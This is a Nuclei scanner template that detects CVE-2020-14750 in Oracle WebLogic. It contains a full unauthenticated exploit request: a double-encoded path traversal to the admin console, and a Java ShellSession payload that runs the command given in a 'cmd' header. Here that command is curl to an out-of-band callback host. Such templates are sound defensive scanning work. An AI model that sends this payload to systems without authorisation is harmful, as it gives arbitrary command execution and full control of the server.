id: CVE-2020-14750
info:
  name: Oracle WebLogic Server - Remote Command Execution
  author: princechaddha,DhiyaneshDk
  severity: critical
  description: Oracle WebLogic Server is vulnerable to remote code execution, allowing
    attackers to execute malware, obtain sensitive information, modify data, and gain
    full control over a compromised machine without credentials.
  reference:
  - https://github.com/pprietosanchez/CVE-2020-14750
  - https://www.oracle.com/security-alerts/alert-cve-2020-14750.html
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14750
  - https://nvd.nist.gov/vuln/detail/CVE-2020-14750
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-14750
  metadata:
    shodan-query: http.html:"Weblogic Application Server"
    verified: 'true'
    impact: The impact of CVE-2020-14750 on Oracle WebLogic Server is severe, as attackers
      can remotely execute code and gain complete control over compromised machines
      without having to enter necessary credentials.
    recommendation: It is highly recommended to apply the October 2020 Critical Patch
      Update to address the CVE-2020-14750 vulnerability on Oracle WebLogic Server
      and prevent remote command execution.
  tags: cve,cve2020,rce,oracle,weblogic,unauth,kev
requests:
- raw:
  - "@timeout: 10s\nPOST /console/css/%252e%252e%252fconsole.portal HTTP/1.1\nHost:\
    \ {{Hostname}}\nUser-Agent: curl/7.79.1\nAccept: */*\ncmd: curl {{interactsh-url}}\n\
    Content-Type: application/x-www-form-urlencoded\n\n_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"\
    weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();\n\
    weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();\njava.lang.reflect.Field\
    \ field = adapter.getClass().getDeclaredField(\"connectionHandler\");\nfield.setAccessible(true);\n\
    Object obj = field.get(adapter);\nweblogic.servlet.internal.ServletRequestImpl\
    \ req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"\
    getServletRequest\").invoke(obj);\nString cmd = req.getHeader(\"cmd\");\nString[]\
    \ cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ?\
    \ new String[]{\"cmd.exe\", \"/c\", cmd} : new String[]{\"/bin/sh\", \"-c\", cmd};\n\
    if (cmd != null) {\n    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\
    \\\\A\").next();\n    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)\
    \ req.getClass().getMethod(\"getResponse\").invoke(req);\n    res.getServletOutputStream().writeStream(new\
    \ weblogic.xml.util.StringInputStream(result));\n    res.getServletOutputStream().flush();\n\
    \    res.getWriter().write(\"\");\n}executeThread.interrupt();\n\");\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    part: header
    words:
    - ADMINCONSOLESESSION=
  - type: regex
    part: body
    regex:
    - <html><head></head><body>(.*)</body></html>
